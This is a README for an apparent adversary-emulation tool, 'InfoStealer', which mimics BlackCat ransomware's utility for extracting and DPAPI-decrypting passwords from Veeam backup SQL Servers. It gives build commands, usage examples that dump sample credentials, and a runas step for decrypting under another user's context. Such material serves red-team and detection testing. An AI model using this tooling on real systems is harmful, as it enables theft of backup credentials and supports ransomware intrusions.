## InfoStealer

This C# utility emulates BlackCat's custom utility to query Veeam backup SQL Server to extract passwords.

## Building

* Leverage CMake to build the executable in the project's root directory.
```
$> cmake -B .
```

*Note, CMakeLists is wrapping dotnet commands to build the CSharp application*


This command will generate a debug and release build. You will want the release build,
this is located at ```infostealer\sqlsharp\bin\x64\Release\net6.0-windows\win-x86\publish```

Build with dotnet
```
dotnet restore InfoStealer.sln

dotnet publish InfoStealer.sln -r win-x86 -p:PlatformTarget=x86 -p:PublishSingleFile=true --sc -c Release -p:IncludeNativeLibrariesForSelfExtract=true
```

## Execution

A DPAPI blob can be generated using the `gen_dpapi_blob.ps1` script. The script takes 1 argument
`-String` and encrypted the provided string with DPAPI.
Example:
```
./gen_dpapi_blob.ps1 -String Sup3rS3cr3tP@ssword1!
```


* Query local MS SQL server (**localhost**) with specific username (**testlogin**), and password (**Password**)

```
C:\> .\infostealer.exe dpapi localhost testlogin Password*

test-1, abc123, test-1 user
test-2, hunter2, test-2 user
test-3, iloveu, test-3 user
test-4, qwerty, test-4 user
test-5, password, test-5 user
```

* Decrypt a provide dpapi base64 encoded blob:
```
InfoStealer.exe string AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAZGBrWVmdPka5Sod9PXlnJgAAAAACAAAAAAAQZgAAAAEAACAAAAAPXaR6tzM6G7mdC2NnJ7u2On2rDD1FzQdBKcaf1uhWkwAAAAAOgAAAAAIAACAAAAD8ZUG03DrI9ncxu4Csr6GYhu7vnO2wEi8ZscVSK+qL2RAAAABoGWkFNCJFa1oAlN63k+I/QAAAABx0tHePfk99nrSpOqsbmOaAR8b95SOCBRZKbOnsOaDUcVjMWAeQ2AptPJz2HtfXrhSPEHHbvD/H8mG4gr6yaB8=
```

* Execute Help menu
```
C:\> infostealer.exe -h
[help] sqlsharp.exe <type> <SQL Database Source> username password
         Ex: sqlsharp.exe dpapi localhost veemadmin Password*
         Ex: sqlsharp.exe string <base64 encoded dpapi blob>
         type: base64, dpapi, string; (a string is a base64 encoded dpapi blob passed directly in)
```

### Executing under another user context
If the passwords are DPAPI encrypted using another users password, you can run the applcation
using that users context as long as you have the users password:
Open a command prompt, then enter the following:
```
runas /user:<USERNAME> cmd

InfoStealer.exe string AQAAAN...
```

## CTI
* [Noberus Ransomware: Darkside and BlackMatter Successor Continues to Evolve its Tactics](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps)

* [Decrypting VEEAM Passwords](https://blog.checkymander.com/red%20team/veeam/decrypt-veeam-passwords/)
